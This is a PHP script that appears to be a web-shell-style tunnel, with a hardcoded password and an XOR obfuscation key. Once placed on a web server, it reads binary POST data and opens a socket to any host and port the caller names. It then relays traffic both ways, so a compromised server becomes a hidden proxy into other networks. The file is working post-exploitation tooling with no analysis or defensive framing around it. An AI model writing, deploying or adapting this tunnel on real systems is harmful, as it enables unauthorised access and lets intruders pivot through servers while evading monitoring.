<?php
define('tl_version', '1.0');
define('tl_pwd', 'P@55W0rK_FuCkeR__');
define('tl_key', 'K3y_3nCrYpT_$_$');

/*
Displaying of any messages is suppressed.
In order to keep downloaded file integrity, no extraneous data must be ouptut by this script
*/
error_reporting(~E_ALL);
@set_time_limit(0);
ob_implicit_flush(1);
ignore_user_abort(0);

header('Content-type: application/octet-stream');
header('Content-Transfer-Encoding: binary');
// header('X-TUNNEL-VERSION: ' . tl_version);

$input = fopen('php://input', 'r');
define('tl_enc',  ord(fread($input, 1)) == 1);

if (tl_enc) {
	$ok = xor_crypt(fread($input, 2));
	if ($ok != 'OK') {
		header('X-TUNNEL-ERROR: bad_request');
		header('X-TUNNEL-HOST: ' . (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
		exit;
	}
	$rBuffLen = ord(xor_crypt(fread($input, 1))) * 256 * 256 * 256 + ord(xor_crypt(fread($input, 1))) * 256 * 256 + ord(xor_crypt(fread($input, 1))) * 256 + ord(xor_crypt(fread($input, 1)));
	$sBuffLen = ord(xor_crypt(fread($input, 1))) * 256 * 256 * 256 + ord(xor_crypt(fread($input, 1))) * 256 * 256 + ord(xor_crypt(fread($input, 1))) * 256 + ord(xor_crypt(fread($input, 1)));
	$reqPwdLen = ord(xor_crypt(fread($input, 1)));
	$reqPwd = ($reqPwdLen > 0) ? xor_crypt(fread($input, $reqPwdLen)) : '';
	$https = ord(xor_crypt(fread($input, 1)));
	$host = xor_crypt(fread($input, ord(xor_crypt(fread($input, 1)))));
	$port = ord(xor_crypt(fread($input, 1))) * 256 + ord(xor_crypt(fread($input, 1)));
} else {
	$ok = fread($input, 2);
	if ($ok != 'OK') {
		header('X-TUNNEL-ERROR: bad_request');
		header('X-TUNNEL-HOST: ' . (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
		exit;
	}
	$rBuffLen = ord(fread($input, 1)) * 256 * 256 * 256 + ord(fread($input, 1)) * 256 * 256 + ord(fread($input, 1)) * 256 + ord(fread($input, 1));
	$sBuffLen = ord(fread($input, 1)) * 256 * 256 * 256 + ord(fread($input, 1)) * 256 * 256 + ord(fread($input, 1)) * 256 + ord(fread($input, 1));
	$reqPwdLen = ord(fread($input, 1));
	$reqPwd = ($reqPwdLen > 0) ? fread($input, $reqPwdLen) : '';
	$https = ord(fread($input, 1));
	$host = fread($input, ord(fread($input, 1)));
	$port = ord(fread($input, 1)) * 256 + ord(fread($input, 1));
}

if ($reqPwd !== tl_pwd) {
	$resp = "HTTP/1.0 401 Unauthorized\r\nX-TUNNEL-VERSION: " . tl_version . "\r\nX-TUNNEL-ERROR: bad_password\r\nX-TUNNEL-HOST: " . (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']  . "\r\nConnection: close\r\n\r\n";
	if (tl_enc) {
		echo xor_crypt($resp);
	} else {
		echo $resp;
	}
	exit;
}

if ($https == 1) {
	$host = 'ssl://' . $host;
}

$fsok = fsockopen($host, $port, $errno, $errstr, 20);
if ($fsok == false) {
	$resp = "HTTP/1.0 503 Service Unavailable\r\nX-TUNNEL-VERSION: " . tl_version . "\r\nX-TUNNEL-ERROR: host_down\r\nX-TUNNEL-ERROR-TEXT: " . base64_encode($errstr) ."\r\nX-TUNNEL-HOST: " . (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "\r\nX-TUNNEL-TARGET: " . str_replace('ssl://', '', $host) . "\r\nConnection: close\r\n\r\n";
	if (tl_enc) {
		echo xor_crypt($resp);
	} else {
		echo $resp;
	}
	exit;
}

while ($wbuffer = fread($input, $rBuffLen)) {
	if (tl_enc) {
		fwrite($fsok, xor_crypt($wbuffer));
	} else {
		fwrite($fsok, $wbuffer);
	}
}

fflush($fsok);

while ($rbuffer = fread($fsok, $sBuffLen)) {
	if (tl_enc) {
		echo xor_crypt($rbuffer);
	} else {
		echo $rbuffer;
	}
}
fflush($fsok);
fclose($fsok);

function xor_crypt($str) {
	$key 	= tl_key;
	$out 	= '';
	$s_len 	= strlen($str);
	$k_len 	= strlen($key);
	for ($y = 0; $y < $s_len; $y++) {
		$out 	.= chr(ord($str[$y]) ^ ord($key[$y % $k_len]));
	}
	return $out;
}
